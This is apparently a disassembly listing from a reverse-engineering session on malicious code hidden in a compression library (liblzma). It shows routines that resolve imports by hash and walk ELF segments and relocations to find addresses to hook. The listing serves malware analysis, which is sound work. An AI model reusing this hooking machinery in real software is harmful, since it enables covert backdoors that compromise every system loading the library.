.text.lzma_delta_props_encoda:0000000000004183 loc_4183:                               ; CODE XREF: resolve_imports+10A↑j
.text.lzma_delta_props_encoda:0000000000004183                 mov     rax, [r12+8]
.text.lzma_delta_props_encoda:0000000000004188                 mov     rdx, [r15+10h]
.text.lzma_delta_props_encoda:000000000000418C                 mov     ecx, 4
.text.lzma_delta_props_encoda:0000000000004191                 mov     rdi, [rax+8]
.text.lzma_delta_props_encoda:0000000000004195                 mov     rax, [r15+8]
.text.lzma_delta_props_encoda:0000000000004199                 add     rax, [rdi]
.text.lzma_delta_props_encoda:000000000000419C                 mov     rsi, rax
.text.lzma_delta_props_encoda:000000000000419F                 mov     [rsp+68h+var_50], rax
.text.lzma_delta_props_encoda:00000000000041A4                 call    process_elf_seg ; PIC mode
.text.lzma_delta_props_encoda:00000000000041A9                 lea     rdx, [r13+960h]
.text.lzma_delta_props_encoda:00000000000041B0                 test    eax, eax
.text.lzma_delta_props_encoda:00000000000041B2                 jnz     short loc_41E0
.text.lzma_delta_props_encoda:00000000000041B4
.text.lzma_delta_props_encoda:00000000000041B4 loc_41B4:                               ; CODE XREF: resolve_imports+175↓j
.text.lzma_delta_props_encoda:00000000000041B4                                         ; resolve_imports+1C3↓j
.text.lzma_delta_props_encoda:00000000000041B4                 mov     rdi, [r14+68h]
.text.lzma_delta_props_encoda:00000000000041B8                 mov     rsi, [rsp+68h+lzma_allocator2]
.text.lzma_delta_props_encoda:00000000000041BD                 call    lzma_free       ; PIC mode
.text.lzma_delta_props_encoda:00000000000041C2
.text.lzma_delta_props_encoda:00000000000041C2 loc_41C2:                               ; CODE XREF: resolve_imports+39↑j
.text.lzma_delta_props_encoda:00000000000041C2                                         ; resolve_imports+F2↑j ...
.text.lzma_delta_props_encoda:00000000000041C2                 xor     eax, eax
.text.lzma_delta_props_encoda:00000000000041C4                 jmp     loc_434A
.text.lzma_delta_props_encoda:00000000000041C9 ; ---------------------------------------------------------------------------
.text.lzma_delta_props_encoda:00000000000041C9
.text.lzma_delta_props_encoda:00000000000041C9 loc_41C9:                               ; CODE XREF: resolve_imports+173↓j
.text.lzma_delta_props_encoda:00000000000041C9                 mov     r9, [r12+8]
.text.lzma_delta_props_encoda:00000000000041CE                 mov     rax, [r9+18h]
.text.lzma_delta_props_encoda:00000000000041D2                 mov     rcx, [rax+50h]
.text.lzma_delta_props_encoda:00000000000041D6                 cmp     [r13+0], rcx
.text.lzma_delta_props_encoda:00000000000041DA                 jz      short loc_41E7
.text.lzma_delta_props_encoda:00000000000041DC
.text.lzma_delta_props_encoda:00000000000041DC loc_41DC:                               ; CODE XREF: resolve_imports+17F↓j
.text.lzma_delta_props_encoda:00000000000041DC                 add     r13, 8
.text.lzma_delta_props_encoda:00000000000041E0
.text.lzma_delta_props_encoda:00000000000041E0 loc_41E0:                               ; CODE XREF: resolve_imports+142↑j
.text.lzma_delta_props_encoda:00000000000041E0                 cmp     r13, rdx
.text.lzma_delta_props_encoda:00000000000041E3                 jnz     short loc_41C9
.text.lzma_delta_props_encoda:00000000000041E5                 jmp     short loc_41B4
.text.lzma_delta_props_encoda:00000000000041E7 ; ---------------------------------------------------------------------------
.text.lzma_delta_props_encoda:00000000000041E7
.text.lzma_delta_props_encoda:00000000000041E7 loc_41E7:                               ; CODE XREF: resolve_imports+16A↑j
.text.lzma_delta_props_encoda:00000000000041E7                 mov     rax, [rax+58h]
.text.lzma_delta_props_encoda:00000000000041EB                 cmp     [r13+8], rax
.text.lzma_delta_props_encoda:00000000000041EF                 jnz     short loc_41DC
.text.lzma_delta_props_encoda:00000000000041F1                 mov     rax, [r12]
.text.lzma_delta_props_encoda:00000000000041F5                 lea     r10, [r13+18h]
.text.lzma_delta_props_encoda:00000000000041F9                 xor     ecx, ecx
.text.lzma_delta_props_encoda:00000000000041FB                 or      rdx, 0FFFFFFFFFFFFFFFFh
.text.lzma_delta_props_encoda:00000000000041FF                 mov     rsi, [rax+10h]
.text.lzma_delta_props_encoda:0000000000004203                 lea     rax, [r13+68h]
.text.lzma_delta_props_encoda:0000000000004207                 jmp     short loc_422A
.text.lzma_delta_props_encoda:0000000000004209 ; ---------------------------------------------------------------------------
.text.lzma_delta_props_encoda:0000000000004209
.text.lzma_delta_props_encoda:0000000000004209 loc_4209:                               ; CODE XREF: resolve_imports+1BD↓j
.text.lzma_delta_props_encoda:0000000000004209                 mov     rdi, [rsi]
.text.lzma_delta_props_encoda:000000000000420C                 cmp     rdi, r10
.text.lzma_delta_props_encoda:000000000000420F                 jb      short loc_4226
.text.lzma_delta_props_encoda:0000000000004211                 cmp     rax, rdx
.text.lzma_delta_props_encoda:0000000000004214                 mov     r11, rdx
.text.lzma_delta_props_encoda:0000000000004217                 cmovbe  r11, rax
.text.lzma_delta_props_encoda:000000000000421B                 cmp     rdi, r11
.text.lzma_delta_props_encoda:000000000000421E                 cmovb   rcx, rsi
.text.lzma_delta_props_encoda:0000000000004222                 cmovb   rdx, rdi
.text.lzma_delta_props_encoda:0000000000004226
.text.lzma_delta_props_encoda:0000000000004226 loc_4226:                               ; CODE XREF: resolve_imports+19F↑j
.text.lzma_delta_props_encoda:0000000000004226                 add     rsi, 8
.text.lzma_delta_props_encoda:000000000000422A
.text.lzma_delta_props_encoda:000000000000422A loc_422A:                               ; CODE XREF: resolve_imports+197↑j
.text.lzma_delta_props_encoda:000000000000422A                 cmp     rsi, r10
.text.lzma_delta_props_encoda:000000000000422D                 jb      short loc_4209
.text.lzma_delta_props_encoda:000000000000422F                 cmp     rdx, 0FFFFFFFFFFFFFFFFh
.text.lzma_delta_props_encoda:0000000000004233                 jz      loc_41B4
.text.lzma_delta_props_encoda:0000000000004239                 mov     [rsp+68h+var_30], rcx
.text.lzma_delta_props_encoda:000000000000423E                 mov     rax, [r9+10h]
.text.lzma_delta_props_encoda:0000000000004242                 mov     edi, 0AB8h
.text.lzma_delta_props_encoda:0000000000004247                 mov     rcx, [rsp+68h+var_60]
.text.lzma_delta_props_encoda:000000000000424C                 mov     [rsp+68h+var_38], rdx
.text.lzma_delta_props_encoda:0000000000004251                 mov     [rcx+10h], rax
.text.lzma_delta_props_encoda:0000000000004255                 mov     rsi, rcx
.text.lzma_delta_props_encoda:0000000000004258                 call    lzma_alloc      ; PIC mode
.text.lzma_delta_props_encoda:000000000000425D                 mov     rdx, [rsp+68h+var_38]
.text.lzma_delta_props_encoda:0000000000004262                 mov     rcx, [rsp+68h+var_30]
.text.lzma_delta_props_encoda:0000000000004267                 test    rax, rax
.text.lzma_delta_props_encoda:000000000000426A                 mov     [rbx+28h], rax
.text.lzma_delta_props_encoda:000000000000426E                 jz      short loc_4272
.text.lzma_delta_props_encoda:0000000000004270                 inc     dword ptr [rbx]
.text.lzma_delta_props_encoda:0000000000004272
.text.lzma_delta_props_encoda:0000000000004272 loc_4272:                               ; CODE XREF: resolve_imports+1FE↑j
.text.lzma_delta_props_encoda:0000000000004272                 mov     rdi, [r12]
.text.lzma_delta_props_encoda:0000000000004276                 mov     rsi, [rdi+10h]
.text.lzma_delta_props_encoda:000000000000427A                 sub     rdx, rsi
.text.lzma_delta_props_encoda:000000000000427D                 mov     rax, rsi
.text.lzma_delta_props_encoda:0000000000004280                 mov     r13, rdx
.text.lzma_delta_props_encoda:0000000000004283                 sub     rax, rcx
.text.lzma_delta_props_encoda:0000000000004286                 cmp     rcx, rsi
.text.lzma_delta_props_encoda:0000000000004289                 jb      short loc_4291
.text.lzma_delta_props_encoda:000000000000428B                 mov     rax, rcx
.text.lzma_delta_props_encoda:000000000000428E                 sub     rax, rsi
.text.lzma_delta_props_encoda:0000000000004291
.text.lzma_delta_props_encoda:0000000000004291 loc_4291:                               ; CODE XREF: resolve_imports+219↑j
.text.lzma_delta_props_encoda:0000000000004291                 mov     rcx, [rsp+68h+var_48]
.text.lzma_delta_props_encoda:0000000000004296                 mov     eax, eax
.text.lzma_delta_props_encoda:0000000000004298                 add     rax, [rdi+18h]
.text.lzma_delta_props_encoda:000000000000429C                 mov     rdx, r13
.text.lzma_delta_props_encoda:000000000000429F                 mov     rdi, [rsp+68h+var_50]
.text.lzma_delta_props_encoda:00000000000042A4                 mov     rsi, [rsp+68h+var_50]
.text.lzma_delta_props_encoda:00000000000042A9                 mov     [rcx+0F8h], rax
.text.lzma_delta_props_encoda:00000000000042B0                 add     rsi, [r15+10h]
.text.lzma_delta_props_encoda:00000000000042B4                 call    _Llzma_raw_encoder_0 ; PIC mode
.text.lzma_delta_props_encoda:00000000000042B9                 test    eax, eax
.text.lzma_delta_props_encoda:00000000000042BB                 jz      loc_41C2
.text.lzma_delta_props_encoda:00000000000042C1                 mov     rax, [rsp+68h+var_48]
.text.lzma_delta_props_encoda:00000000000042C6                 mov     rdx, r13
.text.lzma_delta_props_encoda:00000000000042C9                 mov     rdi, [rax+100h]
.text.lzma_delta_props_encoda:00000000000042D0                 mov     rsi, [rax+108h]
.text.lzma_delta_props_encoda:00000000000042D7                 add     rsi, rdi
.text.lzma_delta_props_encoda:00000000000042DA                 call    _Llzma_raw_encoder_0 ; PIC mode
.text.lzma_delta_props_encoda:00000000000042DF                 test    eax, eax
.text.lzma_delta_props_encoda:00000000000042E1                 jz      loc_41C2
.text.lzma_delta_props_encoda:00000000000042E7                 mov     rax, [r12+8]
.text.lzma_delta_props_encoda:00000000000042EC                 mov     rcx, [rsp+68h+var_60]
.text.lzma_delta_props_encoda:00000000000042F1                 mov     edi, 9F8h
.text.lzma_delta_props_encoda:00000000000042F6                 mov     rax, [rax+10h]
.text.lzma_delta_props_encoda:00000000000042FA                 mov     rsi, rcx
.text.lzma_delta_props_encoda:00000000000042FD                 mov     [rcx+10h], rax
.text.lzma_delta_props_encoda:0000000000004301                 call    lzma_alloc      ; PIC mode
.text.lzma_delta_props_encoda:0000000000004306                 mov     [rbx+30h], rax
.text.lzma_delta_props_encoda:000000000000430A                 test    rax, rax
.text.lzma_delta_props_encoda:000000000000430D                 jz      short loc_4311
.text.lzma_delta_props_encoda:000000000000430F                 inc     dword ptr [rbx]
.text.lzma_delta_props_encoda:0000000000004311
.text.lzma_delta_props_encoda:0000000000004311 loc_4311:                               ; CODE XREF: resolve_imports+29D↑j
.text.lzma_delta_props_encoda:0000000000004311                 mov     rsi, [rsp+68h+var_60]
.text.lzma_delta_props_encoda:0000000000004316                 mov     edi, 760h
.text.lzma_delta_props_encoda:000000000000431B                 call    lzma_alloc      ; PIC mode
.text.lzma_delta_props_encoda:0000000000004320                 mov     [rbx+60h], rax
.text.lzma_delta_props_encoda:0000000000004324                 test    rax, rax
.text.lzma_delta_props_encoda:0000000000004327                 jz      short loc_432B
.text.lzma_delta_props_encoda:0000000000004329                 inc     dword ptr [rbx]
.text.lzma_delta_props_encoda:000000000000432B
.text.lzma_delta_props_encoda:000000000000432B loc_432B:                               ; CODE XREF: resolve_imports+2B7↑j
.text.lzma_delta_props_encoda:000000000000432B                 mov     rax, [r12+8]
.text.lzma_delta_props_encoda:0000000000004330                 mov     rbx, [rsp+68h+lzma_allocator2]
.text.lzma_delta_props_encoda:0000000000004335                 mov     rax, [rax+20h]
.text.lzma_delta_props_encoda:0000000000004339                 mov     [rbx+10h], rax
.text.lzma_delta_props_encoda:000000000000433D                 mov     rax, [rsp+68h+var_40]
.text.lzma_delta_props_encoda:0000000000004342                 mov     [rax], r13
.text.lzma_delta_props_encoda:0000000000004345                 mov     eax, 1
.text.lzma_delta_props_encoda:000000000000434A
.text.lzma_delta_props_encoda:000000000000434A loc_434A:                               ; CODE XREF: resolve_imports+154↑j
.text.lzma_delta_props_encoda:000000000000434A                 add     rsp, 40h
.text.lzma_delta_props_encoda:000000000000434E                 pop     rbx
.text.lzma_delta_props_encoda:000000000000434F                 pop     r12
.text.lzma_delta_props_encoda:0000000000004351                 pop     r13
.text.lzma_delta_props_encoda:0000000000004353                 pop     r14
.text.lzma_delta_props_encoda:0000000000004355                 pop     r15
.text.lzma_delta_props_encoda:0000000000004357                 retn
.text.lzma_delta_props_encoda:0000000000004357 resolve_imports endp
.text.lzma_delta_props_encoda:0000000000004357
.text.lzma_delta_props_encoda:0000000000004357 _text_lzma_delta_props_encoda ends
.text.lzma_delta_props_encoda:0000000000004357
.text.lzma_filter_flags_decoda:0000000000004360 ; ===========================================================================
.text.lzma_filter_flags_decoda:0000000000004360
.text.lzma_filter_flags_decoda:0000000000004360 ; Segment type: Pure code
.text.lzma_filter_flags_decoda:0000000000004360 ; Segment permissions: Read/Execute
.text.lzma_filter_flags_decoda:0000000000004360 _text_lzma_filter_flags_decoda segment para public 'CODE' use64
.text.lzma_filter_flags_decoda:0000000000004360                 assume cs:_text_lzma_filter_flags_decoda
.text.lzma_filter_flags_decoda:0000000000004360                 ;org 4360h
.text.lzma_filter_flags_decoda:0000000000004360                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_filter_flags_decoda:0000000000004360
.text.lzma_filter_flags_decoda:0000000000004360 ; =============== S U B R O U T I N E =======================================
.text.lzma_filter_flags_decoda:0000000000004360
.text.lzma_filter_flags_decoda:0000000000004360
.text.lzma_filter_flags_decoda:0000000000004360 ; __int64 __fastcall Llzma_filter_flags_decode_0(struct_elf_info *, struct_elf_info *, _QWORD *, __int64)
.text.lzma_filter_flags_decoda:0000000000004360 _Llzma_filter_flags_decode_0 proc near  ; CODE XREF: _Llzma_lz_decoder_init_0+195↓p
.text.lzma_filter_flags_decoda:0000000000004360
.text.lzma_filter_flags_decoda:0000000000004360 var_B8          = qword ptr -0B8h
.text.lzma_filter_flags_decoda:0000000000004360 var_B0          = qword ptr -0B0h
.text.lzma_filter_flags_decoda:0000000000004360 var_A8          = qword ptr -0A8h
.text.lzma_filter_flags_decoda:0000000000004360 var_A0          = qword ptr -0A0h
.text.lzma_filter_flags_decoda:0000000000004360 var_8C          = dword ptr -8Ch
.text.lzma_filter_flags_decoda:0000000000004360 var_88          = qword ptr -88h
.text.lzma_filter_flags_decoda:0000000000004360 var_80          = qword ptr -80h
.text.lzma_filter_flags_decoda:0000000000004360 var_78          = qword ptr -78h
.text.lzma_filter_flags_decoda:0000000000004360 var_6F          = byte ptr -6Fh
.text.lzma_filter_flags_decoda:0000000000004360 var_65          = byte ptr -65h
.text.lzma_filter_flags_decoda:0000000000004360 var_64          = dword ptr -64h
.text.lzma_filter_flags_decoda:0000000000004360 var_50          = qword ptr -50h
.text.lzma_filter_flags_decoda:0000000000004360 var_30          = byte ptr -30h
.text.lzma_filter_flags_decoda:0000000000004360
.text.lzma_filter_flags_decoda:0000000000004360                 endbr64
.text.lzma_filter_flags_decoda:0000000000004364                 push    r15
.text.lzma_filter_flags_decoda:0000000000004366                 xor     eax, eax
.text.lzma_filter_flags_decoda:0000000000004368                 push    r14
.text.lzma_filter_flags_decoda:000000000000436A                 mov     r14, rsi
.text.lzma_filter_flags_decoda:000000000000436D                 mov     esi, 0A98h      ; hash
.text.lzma_filter_flags_decoda:0000000000004372                 push    r13
.text.lzma_filter_flags_decoda:0000000000004374                 push    r12
.text.lzma_filter_flags_decoda:0000000000004376                 mov     r12, rdx
.text.lzma_filter_flags_decoda:0000000000004379                 xor     edx, edx
.text.lzma_filter_flags_decoda:000000000000437B                 push    rbx
.text.lzma_filter_flags_decoda:000000000000437C                 mov     rbx, rcx
.text.lzma_filter_flags_decoda:000000000000437F                 sub     rsp, 90h
.text.lzma_filter_flags_decoda:0000000000004386                 mov     [rsp+0B8h+var_8C], edx
.text.lzma_filter_flags_decoda:000000000000438A                 xor     edx, edx        ; a3
.text.lzma_filter_flags_decoda:000000000000438C                 mov     [rsp+0B8h+var_B8], rdi
.text.lzma_filter_flags_decoda:0000000000004390                 mov     [rsp+0B8h+var_88], rax
.text.lzma_filter_flags_decoda:0000000000004395                 call    import_lookup_get_str ; PIC mode
.text.lzma_filter_flags_decoda:000000000000439A                 test    rax, rax
.text.lzma_filter_flags_decoda:000000000000439D                 jz      loc_453F
.text.lzma_filter_flags_decoda:00000000000043A3                 mov     rdi, [rsp+0B8h+var_B8]
.text.lzma_filter_flags_decoda:00000000000043A7                 xor     edx, edx
.text.lzma_filter_flags_decoda:00000000000043A9                 lea     rsi, [rsp+0B8h+var_8C]
.text.lzma_filter_flags_decoda:00000000000043AE                 mov     r15, rax
.text.lzma_filter_flags_decoda:00000000000043B1                 mov     [rsp+0B8h+var_8C], 6A8h
.text.lzma_filter_flags_decoda:00000000000043B9                 call    _Llzip_decode_0 ; PIC mode
.text.lzma_filter_flags_decoda:00000000000043BE                 test    rax, rax
.text.lzma_filter_flags_decoda:00000000000043C1                 mov     [rsp+0B8h+var_B0], rax
.text.lzma_filter_flags_decoda:00000000000043C6                 jz      loc_453F
.text.lzma_filter_flags_decoda:00000000000043CC                 xor     edx, edx        ; a3
.text.lzma_filter_flags_decoda:00000000000043CE                 mov     esi, 9D0h       ; hash
.text.lzma_filter_flags_decoda:00000000000043D3                 mov     rdi, r14        ; a1
.text.lzma_filter_flags_decoda:00000000000043D6                 call    import_lookup_get_str ; PIC mode
.text.lzma_filter_flags_decoda:00000000000043DB                 mov     rdi, [rsp+0B8h+var_B8]
.text.lzma_filter_flags_decoda:00000000000043DF                 lea     rsi, [rsp+0B8h+var_88]
.text.lzma_filter_flags_decoda:00000000000043E4                 mov     r13, rax
.text.lzma_filter_flags_decoda:00000000000043E7                 call    _Llzma_check_update_0 ; PIC mode
.text.lzma_filter_flags_decoda:00000000000043EC                 mov     rdi, rax
.text.lzma_filter_flags_decoda:00000000000043EF                 test    rax, rax
.text.lzma_filter_flags_decoda:00000000000043F2                 jz      loc_453F
.text.lzma_filter_flags_decoda:00000000000043F8                 mov     rsi, [rsp+0B8h+var_88]
.text.lzma_filter_flags_decoda:00000000000043FD                 mov     rdx, [rsp+0B8h+var_B0]
.text.lzma_filter_flags_decoda:0000000000004402                 add     rsi, rax
.text.lzma_filter_flags_decoda:0000000000004405                 call    _Lstream_encode_1 ; PIC mode
.text.lzma_filter_flags_decoda:000000000000440A                 mov     r10, rax
.text.lzma_filter_flags_decoda:000000000000440D                 test    rax, rax
.text.lzma_filter_flags_decoda:0000000000004410                 jz      loc_453F
.text.lzma_filter_flags_decoda:0000000000004416                 test    r13, r13
.text.lzma_filter_flags_decoda:0000000000004419                 jz      short loc_442C
.text.lzma_filter_flags_decoda:000000000000441B                 mov     rax, [r13+8]
.text.lzma_filter_flags_decoda:000000000000441F                 add     rax, [r14]
.text.lzma_filter_flags_decoda:0000000000004422                 inc     dword ptr [rbx+120h]
.text.lzma_filter_flags_decoda:0000000000004428                 mov     [rbx+30h], rax
.text.lzma_filter_flags_decoda:000000000000442C
.text.lzma_filter_flags_decoda:000000000000442C loc_442C:                               ; CODE XREF: _Llzma_filter_flags_decode_0+B9↑j
.text.lzma_filter_flags_decoda:000000000000442C                 xor     eax, eax
.text.lzma_filter_flags_decoda:000000000000442E                 lea     rdi, [rsp+0B8h+var_80]
.text.lzma_filter_flags_decoda:0000000000004433                 mov     [rsp+0B8h+var_A0], r10
.text.lzma_filter_flags_decoda:0000000000004438                 lea     r13, [r10-80h]
.text.lzma_filter_flags_decoda:000000000000443C                 mov     ecx, 16h
.text.lzma_filter_flags_decoda:0000000000004441                 rep stosd
.text.lzma_filter_flags_decoda:0000000000004443                 mov     rcx, [rsp+0B8h+var_B8]
.text.lzma_filter_flags_decoda:0000000000004447                 mov     rax, [r15+8]
.text.lzma_filter_flags_decoda:000000000000444B                 mov     edi, 1          ; _QWORD
.text.lzma_filter_flags_decoda:0000000000004450                 add     rax, [rcx]
.text.lzma_filter_flags_decoda:0000000000004453                 mov     [rsp+0B8h+var_B8], rax
.text.lzma_filter_flags_decoda:0000000000004457                 add     rax, [r15+10h]
.text.lzma_filter_flags_decoda:000000000000445B                 mov     [rsp+0B8h+var_B0], rax
.text.lzma_filter_flags_decoda:0000000000004460                 call    get_lzma_allocator ; PIC mode
.text.lzma_filter_flags_decoda:0000000000004465                 mov     edi, 0D10h
.text.lzma_filter_flags_decoda:000000000000446A                 mov     [rax+10h], r14
.text.lzma_filter_flags_decoda:000000000000446E                 mov     rsi, rax
.text.lzma_filter_flags_decoda:0000000000004471                 mov     r15, rax
.text.lzma_filter_flags_decoda:0000000000004474                 call    lzma_alloc      ; PIC mode
.text.lzma_filter_flags_decoda:0000000000004479                 mov     r10, [rsp+0B8h+var_A0]
.text.lzma_filter_flags_decoda:000000000000447E                 mov     [rbx+90h], rax
.text.lzma_filter_flags_decoda:0000000000004485                 test    rax, rax
.text.lzma_filter_flags_decoda:0000000000004488                 lea     rax, [rsp+0B8h+var_80]
.text.lzma_filter_flags_decoda:000000000000448D                 mov     [rsp+0B8h+var_A8], rax
.text.lzma_filter_flags_decoda:0000000000004492                 jz      short loc_449A
.text.lzma_filter_flags_decoda:0000000000004494                 inc     dword ptr [rbx+120h]
.text.lzma_filter_flags_decoda:000000000000449A
.text.lzma_filter_flags_decoda:000000000000449A loc_449A:                               ; CODE XREF: _Llzma_filter_flags_decode_0+132↑j
.text.lzma_filter_flags_decoda:000000000000449A                 xor     r14d, r14d
.text.lzma_filter_flags_decoda:000000000000449D
.text.lzma_filter_flags_decoda:000000000000449D loc_449D:                               ; CODE XREF: _Llzma_filter_flags_decode_0+16D↓j
.text.lzma_filter_flags_decoda:000000000000449D                                         ; _Llzma_filter_flags_decode_0+1C6↓j
.text.lzma_filter_flags_decoda:000000000000449D                 cmp     r13, r10
.text.lzma_filter_flags_decoda:00000000000044A0                 jnb     loc_452B
.text.lzma_filter_flags_decoda:00000000000044A6                 mov     rdx, [rsp+0B8h+var_A8]
.text.lzma_filter_flags_decoda:00000000000044AB                 xor     r8d, r8d
.text.lzma_filter_flags_decoda:00000000000044AE                 mov     rsi, r10
.text.lzma_filter_flags_decoda:00000000000044B1                 mov     rdi, r13
.text.lzma_filter_flags_decoda:00000000000044B4                 mov     ecx, 10Bh
.text.lzma_filter_flags_decoda:00000000000044B9                 mov     [rsp+0B8h+var_A0], r10
.text.lzma_filter_flags_decoda:00000000000044BE                 inc     r13
.text.lzma_filter_flags_decoda:00000000000044C1                 call    _Llzma_properties_size_0 ; PIC mode
.text.lzma_filter_flags_decoda:00000000000044C6                 mov     r10, [rsp+0B8h+var_A0]
.text.lzma_filter_flags_decoda:00000000000044CB                 test    eax, eax
.text.lzma_filter_flags_decoda:00000000000044CD                 jz      short loc_449D
.text.lzma_filter_flags_decoda:00000000000044CF                 mov     rcx, [rsp+0B8h+var_80]
.text.lzma_filter_flags_decoda:00000000000044D4                 test    [rsp+0B8h+var_6F], 1
.text.lzma_filter_flags_decoda:00000000000044D9                 jz      short loc_4519
.text.lzma_filter_flags_decoda:00000000000044DB                 mov     edx, [rsp+0B8h+var_64]
.text.lzma_filter_flags_decoda:00000000000044DF                 mov     rax, [rsp+0B8h+var_50]
.text.lzma_filter_flags_decoda:00000000000044E4                 and     edx, 0FF00FF00h
.text.lzma_filter_flags_decoda:00000000000044EA                 cmp     edx, 5000000h
.text.lzma_filter_flags_decoda:00000000000044F0                 jnz     short loc_44FA
.text.lzma_filter_flags_decoda:00000000000044F2                 add     rax, rcx
.text.lzma_filter_flags_decoda:00000000000044F5                 add     rax, [rsp+0B8h+var_78]
.text.lzma_filter_flags_decoda:00000000000044FA
.text.lzma_filter_flags_decoda:00000000000044FA loc_44FA:                               ; CODE XREF: _Llzma_filter_flags_decode_0+190↑j
.text.lzma_filter_flags_decoda:00000000000044FA                 mov     dl, [rsp+0B8h+var_65]
.text.lzma_filter_flags_decoda:00000000000044FE                 and     edx, 48h
.text.lzma_filter_flags_decoda:0000000000004501                 cmp     dl, 48h ; 'H'
.text.lzma_filter_flags_decoda:0000000000004504                 jz      short loc_4519
.text.lzma_filter_flags_decoda:0000000000004506                 cmp     [rsp+0B8h+var_B8], rax
.text.lzma_filter_flags_decoda:000000000000450A                 jnb     short loc_4519
.text.lzma_filter_flags_decoda:000000000000450C                 lea     rdx, [rax+4]
.text.lzma_filter_flags_decoda:0000000000004510                 cmp     [rsp+0B8h+var_B0], rdx
.text.lzma_filter_flags_decoda:0000000000004515                 cmovnb  r14, rax
.text.lzma_filter_flags_decoda:0000000000004519
.text.lzma_filter_flags_decoda:0000000000004519 loc_4519:                               ; CODE XREF: _Llzma_filter_flags_decode_0+179↑j
.text.lzma_filter_flags_decoda:0000000000004519                                         ; _Llzma_filter_flags_decode_0+1A4↑j ...
.text.lzma_filter_flags_decoda:0000000000004519                 movzx   eax, [rsp+0B8h+var_30]
.text.lzma_filter_flags_decoda:0000000000004521                 lea     r13, [rcx+rax+1]
.text.lzma_filter_flags_decoda:0000000000004526                 jmp     loc_449D
.text.lzma_filter_flags_decoda:000000000000452B ; ---------------------------------------------------------------------------
.text.lzma_filter_flags_decoda:000000000000452B
.text.lzma_filter_flags_decoda:000000000000452B loc_452B:                               ; CODE XREF: _Llzma_filter_flags_decode_0+140↑j
.text.lzma_filter_flags_decoda:000000000000452B                 test    r14, r14
.text.lzma_filter_flags_decoda:000000000000452E                 jnz     short loc_4543
.text.lzma_filter_flags_decoda:0000000000004530
.text.lzma_filter_flags_decoda:0000000000004530 loc_4530:                               ; CODE XREF: _Llzma_filter_flags_decode_0+207↓j
.text.lzma_filter_flags_decoda:0000000000004530                 mov     rdi, [rbx+90h]
.text.lzma_filter_flags_decoda:0000000000004537
.text.lzma_filter_flags_decoda:0000000000004537 loc_4537:                               ; CODE XREF: _Llzma_filter_flags_decode_0+245↓j
.text.lzma_filter_flags_decoda:0000000000004537                 mov     rsi, r15
.text.lzma_filter_flags_decoda:000000000000453A                 call    lzma_free       ; PIC mode
.text.lzma_filter_flags_decoda:000000000000453F
.text.lzma_filter_flags_decoda:000000000000453F loc_453F:                               ; CODE XREF: _Llzma_filter_flags_decode_0+3D↑j
.text.lzma_filter_flags_decoda:000000000000453F                                         ; _Llzma_filter_flags_decode_0+66↑j ...
.text.lzma_filter_flags_decoda:000000000000453F                 xor     eax, eax
.text.lzma_filter_flags_decoda:0000000000004541                 jmp     short loc_45BA
.text.lzma_filter_flags_decoda:0000000000004543 ; ---------------------------------------------------------------------------
.text.lzma_filter_flags_decoda:0000000000004543
.text.lzma_filter_flags_decoda:0000000000004543 loc_4543:                               ; CODE XREF: _Llzma_filter_flags_decode_0+1CE↑j
.text.lzma_filter_flags_decoda:0000000000004543                 mov     rdi, [r12+100h]
.text.lzma_filter_flags_decoda:000000000000454B                 mov     rsi, [r12+108h]
.text.lzma_filter_flags_decoda:0000000000004553                 xor     edx, edx
.text.lzma_filter_flags_decoda:0000000000004555                 mov     r8, r14
.text.lzma_filter_flags_decoda:0000000000004558                 mov     ecx, 10Bh
.text.lzma_filter_flags_decoda:000000000000455D                 add     rsi, rdi
.text.lzma_filter_flags_decoda:0000000000004560                 call    _Llzma_properties_size_0 ; PIC mode
.text.lzma_filter_flags_decoda:0000000000004565                 test    eax, eax
.text.lzma_filter_flags_decoda:0000000000004567                 jz      short loc_4530
.text.lzma_filter_flags_decoda:0000000000004569                 mov     rsi, r15
.text.lzma_filter_flags_decoda:000000000000456C                 mov     edi, 468h
.text.lzma_filter_flags_decoda:0000000000004571                 call    lzma_alloc      ; PIC mode
.text.lzma_filter_flags_decoda:0000000000004576                 mov     [rbx+38h], rax
.text.lzma_filter_flags_decoda:000000000000457A                 test    rax, rax
.text.lzma_filter_flags_decoda:000000000000457D                 jz      short loc_4585
.text.lzma_filter_flags_decoda:000000000000457F                 inc     dword ptr [rbx+120h]
.text.lzma_filter_flags_decoda:0000000000004585
.text.lzma_filter_flags_decoda:0000000000004585 loc_4585:                               ; CODE XREF: _Llzma_filter_flags_decode_0+21D↑j
.text.lzma_filter_flags_decoda:0000000000004585                 cmp     dword ptr [r14], 0
.text.lzma_filter_flags_decoda:0000000000004589                 jnz     short loc_4592
.text.lzma_filter_flags_decoda:000000000000458B                 cmp     qword ptr [r14-8], 0
.text.lzma_filter_flags_decoda:0000000000004590                 jz      short loc_45A7
.text.lzma_filter_flags_decoda:0000000000004592
.text.lzma_filter_flags_decoda:0000000000004592 loc_4592:                               ; CODE XREF: _Llzma_filter_flags_decode_0+229↑j
.text.lzma_filter_flags_decoda:0000000000004592                 mov     rdi, [rbx+90h]
.text.lzma_filter_flags_decoda:0000000000004599                 mov     rsi, r15
.text.lzma_filter_flags_decoda:000000000000459C                 call    lzma_free       ; PIC mode
.text.lzma_filter_flags_decoda:00000000000045A1                 mov     rdi, [rbx+38h]
.text.lzma_filter_flags_decoda:00000000000045A5                 jmp     short loc_4537
.text.lzma_filter_flags_decoda:00000000000045A7 ; ---------------------------------------------------------------------------
.text.lzma_filter_flags_decoda:00000000000045A7
.text.lzma_filter_flags_decoda:00000000000045A7 loc_45A7:                               ; CODE XREF: _Llzma_filter_flags_decode_0+230↑j
.text.lzma_filter_flags_decoda:00000000000045A7                 mov     [r12+78h], r14
.text.lzma_filter_flags_decoda:00000000000045AC                 lea     rax, [r14-8]
.text.lzma_filter_flags_decoda:00000000000045B0                 mov     [r12+70h], rax
.text.lzma_filter_flags_decoda:00000000000045B5                 mov     eax, 1
.text.lzma_filter_flags_decoda:00000000000045BA
.text.lzma_filter_flags_decoda:00000000000045BA loc_45BA:                               ; CODE XREF: _Llzma_filter_flags_decode_0+1E1↑j
.text.lzma_filter_flags_decoda:00000000000045BA                 add     rsp, 90h
.text.lzma_filter_flags_decoda:00000000000045C1                 pop     rbx
.text.lzma_filter_flags_decoda:00000000000045C2                 pop     r12
.text.lzma_filter_flags_decoda:00000000000045C4                 pop     r13
.text.lzma_filter_flags_decoda:00000000000045C6                 pop     r14
.text.lzma_filter_flags_decoda:00000000000045C8                 pop     r15
.text.lzma_filter_flags_decoda:00000000000045CA                 retn
